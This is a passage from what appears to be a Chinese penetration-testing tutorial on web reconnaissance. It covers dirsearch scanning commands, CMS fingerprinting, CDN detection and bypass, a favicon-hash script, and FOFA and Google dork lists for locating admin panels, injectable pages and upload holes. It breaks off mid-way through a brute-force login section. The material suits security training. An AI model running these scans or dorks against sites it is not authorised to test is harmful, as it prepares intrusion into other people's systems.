title="robots.txt"></a>robots.txt</h4><p>Robots协议(Robots Exclusion Protocol)“网络爬虫排除标准”，网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，同时也记录网站所具有基本的目录</p><p><img src="/2023/012220963/8.PNG" alt="8"></p><h3 id="目录扫描工具"><a href="#目录扫描工具" class="headerlink" title="目录扫描工具"></a>目录扫描工具</h3><h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><p>dirsearch是一个基于python3的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件</p><p>GitHub：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p>依赖安装： pip install -r requirements.txt</p><p>简单使用：python dirsearch.py -u 目标地址</p><h6 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">## 基本使用</span>-h  <span class="token comment"># 使用帮助</span>-u  <span class="token comment"># 指定目标url，最好加上协议类型 如http https</span>-L  <span class="token comment"># 指定url列表文件</span>-e  <span class="token comment"># 参数指定网站类型 php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak (-e *代表所有)</span><span class="token comment">## 自定义选项</span>-w  <span class="token comment"># 指定字典扫描</span>-t  <span class="token comment"># 指定线程数（默认20）</span>-r  <span class="token comment"># 递归扫描 扫描到目录文件会进一步向下挖掘</span>-random-agents <span class="token comment">#使用随机UA</span>-H  <span class="token comment"># 使用指定headers (e.g. --header "Referer: example.com" --header "User-Agent: IE")</span>-m  <span class="token comment"># 指定http请求方式，默认get</span>-d  <span class="token comment"># 发送的 data 数据</span>--cookie    <span class="token comment"># 添加 cookie</span>--proxy  <span class="token comment"># 添加代理 e.g. --proxy 127.0.0.1:1080</span><span class="token comment">## 过滤扫描结果</span>-i /         <span class="token comment"># http 状态码白名单 (e.g. 200,300-399)</span>-x / --exclude-status    <span class="token comment"># 排除指定 http 状态码 （e.g.:301,403,500-599)</span>--exclude-texts  <span class="token comment"># 文本排除响应 (e.g.: "Not found", "Error")</span>--exclude-regexps   <span class="token comment"># 按regexp排除响应，用逗号分隔(e.g.: "Not foun[a-z]&#123;1&#125;", "^Error$")</span><span class="token comment">## 报告输出</span>-o 指定报告文件输出地址--format 报告文件格式 <span class="token punctuation">(</span>默认: simple, plain, json, xml,md,csv, html, sqlite<span class="token punctuation">)</span>--log 输出扫描日志文件 <span class="token punctuation">(</span>一般不用<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>常规扫描</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>指定扫描的后缀名</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">-</span>e phppython dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">-</span>e php<span class="token punctuation">,</span>htmlpython dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">-</span>e <span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>过滤状态码扫描</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com <span class="token operator">-</span>e <span class="token operator">*</span> <span class="token operator">-</span>x <span class="token number">302</span>python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com <span class="token operator">-</span>e <span class="token operator">*</span> <span class="token operator">-</span>x <span class="token number">302</span><span class="token punctuation">,</span><span class="token number">404</span>python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com <span class="token operator">-</span>e <span class="token operator">*</span> <span class="token operator">-</span>x <span class="token number">302</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token operator">-</span><span class="token number">409</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>状态码白名单扫描</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com <span class="token operator">-</span>e <span class="token operator">*</span> <span class="token operator">-</span>i <span class="token number">200</span>python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com <span class="token operator">-</span>e <span class="token operator">*</span> <span class="token operator">-</span>i <span class="token number">200</span><span class="token punctuation">,</span><span class="token number">302</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>指定线程数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">-</span>e <span class="token operator">*</span> <span class="token operator">-</span>t <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用指定字典</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com <span class="token operator">-</span>w 字典路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加cookie信息</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>vulfocus<span class="token punctuation">.</span>cn<span class="token operator">/</span><span class="token comment">#/ -e * --cookie "xxxxx"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>指定header头</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u https<span class="token punctuation">:</span><span class="token operator">//</span>vulfocus<span class="token punctuation">.</span>cn<span class="token operator">/</span><span class="token comment">#/ -H "cookie: xxxx"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>指定输出报告</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">-</span>e <span class="token operator">*</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">format</span> html <span class="token operator">-</span>o a<span class="token punctuation">.</span>html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="网站指纹识别"><a href="#网站指纹识别" class="headerlink" title="网站指纹识别"></a>网站指纹识别</h4><p>在web渗透过程中，Web指纹识别是信息收集环节中一个比较重要的步骤，通过一些开源的工具、平台或者手工检测CMS系统是公开的CMS程序还是二次开发至关重要，能准确的获取CMS类型、Web服务组件类型及版本信息可以帮助安全工程师快速有效的去验证已知漏洞。对目标渗透测试过程中，目标的cms是十分重要的信息，有了目标的cms，就可以利用相关bug进行测试，进行代码审计等。</p><h4 id="识别方式"><a href="#识别方式" class="headerlink" title="识别方式"></a>识别方式</h4><p>1.网站特有文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>templets<span class="token operator">/</span>default<span class="token operator">/</span>style<span class="token operator">/</span>dedecms<span class="token punctuation">.</span>css  <span class="token operator">//</span>dedecms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.网站独有文件的md5</p><p>如favicon.ico，但是该文件可以被修改导致不准确。</p><p>文件md5计算 certutil -hashfile filename MD5</p><p>3.网站文件命名规则</p><p>4.返回头的关键字 shiro</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">header<span class="token operator">=</span><span class="token string double-quoted-string">"rememberMe=deleteMe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5.网页关键字 dedecms</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>data<span class="token operator">/</span>admin<span class="token operator">/</span>ver<span class="token operator">.</span>txt<span class="token operator">/</span>data<span class="token operator">/</span>sessions<span class="token operator">/</span>index<span class="token operator">.</span>html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>6.Url特征</p><p>7.网站路径特征</p><p>8.网站静态资源</p><p>9.爬虫网站目录信息</p><p><strong>指纹识别对象</strong></p><p>1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；</p><p>2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；</p><p>3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；</p><p>4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；</p><p>5、开发语言：比如PHP、Java、Ruby、Python、C#等；</p><p>6、操作系统信息：比如linux、win2008、win7、kali、centos等；</p><p>7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；</p><p>8、WAF信息：是否使用waf，如Topsec、safedog、Yundun等；</p><p>9、IP及域名信息：IP和域名注册信息、服务商信息等；</p><p>10、端口信息：有些软件或平台还会探测服务器开放的常见端口。</p><p>示例网站：<a href="http://ask.ltsec.com/">http://ask.ltsec.com/</a></p><h4 id="识别工具"><a href="#识别工具" class="headerlink" title="识别工具"></a>识别工具</h4><p>Kali工具：<strong>whatweb</strong></p><p>whatweb 域名 # 单个域名识别</p><h4 id="在线指纹识别："><a href="#在线指纹识别：" class="headerlink" title="在线指纹识别："></a>在线指纹识别：</h4><p><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></p><p><a href="http://pentest.gdpcisa.org/whatcms">http://pentest.gdpcisa.org/whatcms</a></p><h5 id="指纹探测插件：Wapplyzer"><a href="#指纹探测插件：Wapplyzer" class="headerlink" title="指纹探测插件：Wapplyzer"></a>指纹探测插件：Wapplyzer</h5><h4 id="CDN识别"><a href="#CDN识别" class="headerlink" title="CDN识别"></a>CDN识别</h4><h5 id="认识CDN"><a href="#认识CDN" class="headerlink" title="认识CDN"></a>认识CDN</h5><p>CDN是指内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器。</p><p><img src="/2023/012220963/9.PNG" alt="9"></p><p>通过中心平台的负载均衡内容分发，调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p><p>CDN的基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络内。</p><p>在用户访问网站时，利用全局负载技术将用户的访问<strong>指向距离最近的工作正常的缓存服务器上</strong>，由缓存服务器直接响应用户请求。</p><p><img src="/2023/012220963/10.PNG" alt="10"></p><h5 id="识别CDN"><a href="#识别CDN" class="headerlink" title="识别CDN"></a>识别CDN</h5><p>nslookup</p><p>多地ping网站：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a> <a href="https://tools.ipip.net/ping.php">https://tools.ipip.net/ping.php</a></p><p>在线识别：<a href="https://www.cdnplanet.com/tools/cdnfinder">https://www.cdnplanet.com/tools/cdnfinder</a></p><p>示例网站：<a href="https://royalapps.com/">https://royalapps.com/</a> 、<a href="https://taobao.com/">https://taobao.com</a></p><h3 id="搜索引擎语法"><a href="#搜索引擎语法" class="headerlink" title="搜索引擎语法"></a>搜索引擎语法</h3><h4 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h4><p>网址：<a href="https://fofa.info/">https://fofa.info/</a></p><p><strong>高级搜索</strong></p><p>&amp;&amp; = and </p><p>可以使用括号 和 &amp;&amp; (与) 、|| (或)、 != (非)、等符号，如</p><pre class="line-numbers language-none"><code class="language-none">title&#x3D;&quot;powered by&quot; &amp;&amp; title!&#x3D;&quot;discuz&quot;body&#x3D;&quot;content&#x3D;WordPress&quot; || (header&#x3D;&quot;X-Pingback&quot; &amp;&amp; header&#x3D;&quot;&#x2F;xmlrpc.php&quot; &amp;&amp; body&#x3D;&quot;&#x2F;wp-includes&#x2F;&quot;) &amp;&amp; host&#x3D;&quot;gov.cn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>常用语法</strong></p><pre class="line-numbers language-none"><code class="language-none">domain&#x3D;&quot;qq.com&quot; #查询子域名host&#x3D;&quot;.gov.cn&quot;   #从url中搜索&quot;.gov.cn&quot;header&#x3D;&quot;thinkphp&quot; #从http头中搜索thinkphpport&#x3D;&quot;6379&quot;       #查找对应“6379”端口的资产ip&#x3D;&quot;1.1.1.1&quot;     #从ip中搜索包含“1.1.1.1”的网站ip&#x3D;&quot;220.181.111.1&#x2F;24&quot;   #查询IP为“220.181.111.1”的C网段资产status_code&#x3D;&quot;402&quot; #查询服务器状态为“402”的资产app&#x3D;&quot;通达OA网络智能办公系统&quot;   # 搜索通达OA系统country&#x3D;&quot;CN&quot;     # 搜索指定国家(编码)的资产region&#x3D;&quot;Henan&quot;   # 搜索指定行政区的资产<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="360Quake"><a href="#360Quake" class="headerlink" title="360Quake"></a>360Quake</h4><p><a href="https://quake.360.cn/">https://quake.360.cn/</a></p><h4 id="奇安信鹰图"><a href="#奇安信鹰图" class="headerlink" title="奇安信鹰图"></a>奇安信鹰图</h4><p><a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p><h4 id="google语法"><a href="#google语法" class="headerlink" title="google语法"></a>google语法</h4><p>基本语法</p><p><strong>AND：缺一不可</strong></p><p>谷歌的默认搜索是and逻辑，意思就是，我们在输入关键字后进行搜索时，如输入：“program google”后，会搜出包含“program”和“google”的文件内容，如图</p><p><img src="/2023/012220963/11.PNG" alt="11"></p><p>基础布尔逻辑</p><p>对于一个搜索引擎来说，进行搜索的时候是要搜索到匹配到所有关键词的页面，还是包含关键词中的任意关键词就可以，取决于一个搜索引擎的一些特别算法，称之为搜索引擎的布尔逻辑默认值。</p><p><strong>OR：两者皆可</strong></p><p>而google就是用and作为默认逻辑（搜索到所有的关键词），当然这个前提是我们没有输入一些特殊的命令。如果你不确定你要搜索的内容，或者你想搜索两个中的任意一个，那么就要使用关键词“OR”。注意：OR是大写的，小写是不起作用的，而且，每一个关键词与“OR”之间是有一个空格的，我们来看一下搜索结果。</p><p><img src="/2023/012220963/12.PNG" alt="12"></p><p>当然，可以预想的是，google的结果要比program多得多，所以结果第一页全是有关google的内容。此外，还可以借助计算机体系语言中的“|”来代替“OR”，效果是一样的。</p><p><strong>“”</strong> <strong>：一刻都不能分割</strong></p><p>当然，如果你希望搜索“programgoogle”的内容，而不希望这两个单词之间有任何其他的内容，那么就要使用双引号把搜索的内容组成一个词组”programgoogle”来达到目的。如图所示。</p><p><img src="/2023/012220963/13.PNG" alt="13"></p><p>如上图所示，结果中的programgoogle都是在一起的，没有分割。当然这样的结果比较少，只有2740个，但是看图1，结果却有7亿多个。而且，大部分搜索引擎都有智能断句的功能，如果没有特殊的命令，搜索引擎会一定量的根据大众的语言使用习惯来判断你要搜索什么，而这样的做法，不仅仅没有使搜索引擎显得不听话，反而对大众来讲搜索引擎变得十分智能和高效！</p><p><strong>-</strong> <strong>：不想看到你</strong></p><p>但是如果我们只想看到“program”的内容，而不希望看到“google”的内容，就可以把“-”（减号或者破折号）应用到搜索当中去，语法为“program -google”，注意，“-”之前是有一个空格的，而其后却是和下一个关键词是紧紧相连的！搜索的结果如下图4所示。可以看得到结果中都会包含program，而不包含google</p><p><img src="/2023/012220963/14.PNG" alt="14"></p><p><strong>+</strong> <strong>：就想看到你</strong></p><p>说到这里，还要提一下google的约束扩展问题了。一般来说，当输入关键词后，google会把相关网页和信息的结果呈现在我们面前。然而，有一些单词在搜索引擎中是会被智能忽略的，导致我们得不到想要的结果。比如十分常用的“www”和“the”，基本上任何一个网页上都会找到的东西，就会被google自动忽略（不要觉得这样不好，还是那个道理，在实际引用当中这样做反而显得更加高效和智能）。如果我们不想忽略这些词进行查询，就得在这些关键词的前面加上符号“+”。如下图5所示：</p><p>看上去两者好像没有什么大的区别，其实仔细比较一下搜索结果就可以看得出，加上加号的搜索结果有一万多个，而不加加号的结果却有着55亿多！而因为google和www的关联度比较高，所以在前面的结果表现的差别不大。</p><p><img src="/2023/012220963/15.PNG" alt="15"></p><p><strong>“?”和“*” ：占位通配符</strong></p><p>除了上述字符之外，一些搜索引擎支持一种叫做“stemming”（填充）的技术。Stemming是指在查询的关键词中添加一些通配符，通常是“<em>”，有时候也可能是“？”，这些通配符的作用是要求搜索引擎进行查询是可以返回多个不同的结果。其中通配符代表占位，可以匹配其他任意字母和单词，而其他的字或词组与用户输入的相同。如我们想要搜索“Lionel Messi”的内容，却忘记了第一个单词的一些拼写，就可以输入“”l</em>Messi””进行查询，注意：此处整个字符串是要用一个英文半角双引号括住的！结果如下图所示。　</p><p>可以看到，google自动匹配出Lionel Messi的内容并且进行了搜索。这样的方式有利于我们只能记住单词或短语的一部分的内容时使用。</p><p><img src="/2023/012220963/16.PNG" alt="16"></p><p><strong>特殊语法</strong></p><pre class="line-numbers language-none"><code class="language-none">site：可以限制你搜索范围的域名；inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用；intext: 只搜索网页&lt;body&gt;部分中包含的文字(也就是忽略了标题、URL等的文字)；intitle: 查包含关键词的页面，一般用于社工别人的webshell密码；filetype：搜索文件的后缀或者扩展名；intitle：限制你搜索的网页标题；inanchor: 搜素网站锚节点内容cache   # 缓存搜索 cache 关键字 cache:secquan.org 当一个链接无法访问时（或信息被屏蔽时）；当信息已经被修改，想看以前的信息时<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>常用技巧</strong></p><pre class="line-numbers language-none"><code class="language-none">查找后台地址：site:域名inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|admin|login|sys|managetem|password|username查找可注入点：site:域名 inurl:aspx|jsp|php|asp查找上传漏洞：site:域名 inurl:file|load|editor|Files找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit存在的数据库：site:域名 filetype:mdb|asp|#查看脚本类型：site:域名 filetype:asp&#x2F;aspx&#x2F;php&#x2F;jsp迂回策略入侵：inurl:cms&#x2F;data&#x2F;templates&#x2F;images&#x2F;index&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="bing语法"><a href="#bing语法" class="headerlink" title="bing语法"></a>bing语法</h4><p>bing 搜索语法与 google类似</p><pre class="line-numbers language-none"><code class="language-none">inbody: 查找正文内容     inbody:密码|登陆intitle: 查找标签内容inanchor: 查找锚节点filetype: 查找文件类型site:返回属于指定网站的网页。若要搜索两个或更多域，请使用逻辑运算符OR对域进行分组ip: 查找特点ip的网站<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CDN识别-amp-amp-绕过"><a href="#CDN识别-amp-amp-绕过" class="headerlink" title="CDN识别&amp;&amp;绕过"></a>CDN识别&amp;&amp;绕过</h2><p>CDN 的全称是 Content Delivery Network，即内容分发网络。CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上，但在安全测试过程中，若目标存在 CDN 服务，将会影响到后续的安全测试过程。</p><h3 id="CDN识别-1"><a href="#CDN识别-1" class="headerlink" title="CDN识别"></a>CDN识别</h3><h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><p>GET 请求页面/文件地址，查看 HTTP 响应头中是否存在 “cache xxx” 的值，若存在，则表示有走 CDN。</p><p><img src="/2023/012220963/17.PNG" alt="17"></p><h4 id="ping域名"><a href="#ping域名" class="headerlink" title="ping域名"></a>ping域名</h4><p>ping 域名，查看 ping 的实际地址，若实际地址为 CDN 节点地址，则表示有走 CDN。</p><p><img src="/2023/012220963/18.PNG" alt="18"></p><h4 id="nslookup解析"><a href="#nslookup解析" class="headerlink" title="nslookup解析"></a>nslookup解析</h4><p>nslookup 域名，若解析结果有多个，很有可能存在CDN，相反，若解析结果只有一个，可能不存在CDN(不能肯定)。</p><p><img src="/2023/012220963/19.PNG" alt="19"></p><h4 id="多地ping"><a href="#多地ping" class="headerlink" title="多地ping"></a>多地ping</h4><p>利用多地区的ping服务器操作，然后对比每个地区ping出的IP结果，查看这些IP是否一致， 如果都是一样的，极有可能不存在CDN。如果IP大多不太一样或者规律性很强，可以尝试查询这些IP的归属地，判断是否存在CDN。</p><p><img src="/2023/012220963/20.PNG" alt="20"></p><h3 id="CDN厂商"><a href="#CDN厂商" class="headerlink" title="CDN厂商"></a>CDN厂商</h3><h4 id="CDN厂商识别"><a href="#CDN厂商识别" class="headerlink" title="CDN厂商识别"></a>CDN厂商识别</h4><p><a href="https://www.cdnplanet.com/tools/cdnfinder/#">https://www.cdnplanet.com/tools/cdnfinder/#</a></p><p><a href="http://tools.bugscaner.com/whichcdn/">http://tools.bugscaner.com/whichcdn/</a></p><p>国外厂商：CloudFlare、StackPath、Fastly、CDNetworks、CacheFly、CloudFront</p><p>国内厂商：阿里云CDN、Ucloud、Nodecache、腾讯云CDN、网宿CDN、白山CDN、金山CDN</p><p>CloudFlare <a href="https://gyzzwk.ml/">https://gyzzwk.ml/</a></p><p>StackPath <a href="https://151.139.113.56/">https://151.139.113.56/</a></p><p> Alibaba <a href="https://www.taobao.com/">https://www.taobao.com/</a></p><p>Wangsu <a href="https://www.chinaz.com/">https://www.chinaz.com</a></p><p>Tencent Cloud <a href="https://qq.com/">https://qq.com</a></p><h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><p>CDN是付费的，一些网站主站因为业务需要可能做了CDN加速，但是其他域名可能没有做CDN加速。</p><p>案例：xueersi.com</p><h4 id="第三方网站查询"><a href="#第三方网站查询" class="headerlink" title="第三方网站查询"></a>第三方网站查询</h4><p>网站IP&amp;地址查询：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p><p>历史DNS信息查询：<a href="https://securitytrails.com/app/account">https://securitytrails.com/app/account</a></p><h4 id="国外地址请求"><a href="#国外地址请求" class="headerlink" title="国外地址请求"></a>国外地址请求</h4><p>ping工具：<a href="https://ping.sx/ping">https://ping.sx/ping</a></p><p><a href="https://tools.ipip.net/newping.php">https://tools.ipip.net/newping.php</a></p><p>案例：sp910.com</p><h4 id="邮件服务器获取ip"><a href="#邮件服务器获取ip" class="headerlink" title="邮件服务器获取ip"></a>邮件服务器获取ip</h4><p>目标服务器主动连接我们时，不会受到CDN影响目标网站存在邮件验证等功能时，我们通过查看邮件源码，可能获取邮件服务器IP地址 及 发件人 IP地址。</p><h4 id="文件指纹搜索"><a href="#文件指纹搜索" class="headerlink" title="文件指纹搜索"></a>文件指纹搜索</h4><p>查询网站：shodan.io</p><p>icohash.py # 因为 shodan 高级功能要收费，通过脚本可以获取 ico hash。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mmh3<span class="token keyword">import</span> requests<span class="token keyword">import</span> base64response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com/favicon.ico'</span><span class="token punctuation">)</span>favicon <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token builtin">hash</span> <span class="token operator">=</span> mmh3<span class="token punctuation">.</span><span class="token builtin">hash</span><span class="token punctuation">(</span>favicon<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'http.favicon.hash:'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>案例：baidu.com</p><h5 id="mmh3安装方式"><a href="#mmh3安装方式" class="headerlink" title="mmh3安装方式"></a>mmh3安装方式</h5><p><strong>第一种</strong>（推荐）：</p><p>mmh3 依赖下载地址：<a href="https://www.wheelodex.org/projects/mmh3/wheels/mmh3-3.0.0-cp39-cp39-win_amd64.whl/">https://www.wheelodex.org/projects/mmh3/wheels/mmh3-3.0.0-cp39-cp39-win_amd64.whl/</a></p><p>安装指定依赖包: pip install mmh3-3.0.0-cp39-cp39-win_amd64.whl </p><p><strong>第二种</strong>（不推荐，vs2019非常大）：</p><p>安装vs2019 下载组件 C++ ATL v141 </p><p><img src="/2023/012220963/21.PNG" alt="21"></p><p>然后 pip install mmh3 即可成功安装</p><h4 id="工具扫描全网"><a href="#工具扫描全网" class="headerlink" title="工具扫描全网"></a>工具扫描全网</h4><p>扫描全网开放特定端口的IP，然后获取他们的特定页面的HTM源代码，用这些源代码和目标网站的特定页面的HTM源代码做对比，如果匹配上来了，就很可能是目标网站的真实P，工具匹配会匹配出来很多，最后还是要人工筛选。</p><p><strong>zmap扫描全网</strong></p><h2 id="暴力破解1"><a href="#暴力破解1" class="headerlink" title="暴力破解1"></a>暴力破解1</h2><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p><p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。</p><h3 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h3><p>是指使用字典文件进行爆破，字典多为经验积累其中是一些常见的字符组合。</p><p><strong>待补充</strong></p><h4 id="登录认证流程"><a href="#登录认证流程" class="headerlink" title="登录认证流程"></a>登录认证流程</h4><p><strong>待补充</strong></p><h4 id="简单登录认证模型"><a href="#简单登录认证模型" class="headerlink" title="简单登录认证模型"></a>简单登录认证模型</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta <span class="token assign-left variable">charset</span><span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"X-UA-Compatible"</span> <span class="token assign-left variable">content</span><span class="token operator">=</span><span class="token string">"IE=edge"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>meta <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"viewport"</span> <span class="token assign-left variable">content</span><span class="token operator">=</span><span class="token string">"width=device-width, initial-scale=1.0"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span>Document<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>    <span class="token operator">&lt;</span>form <span class="token assign-left variable">action</span><span class="token operator">=</span><span class="token string">"login.php"</span> <span class="token assign-left variable">method</span><span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">></span>    账号: <span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"text"</span> <span class="token 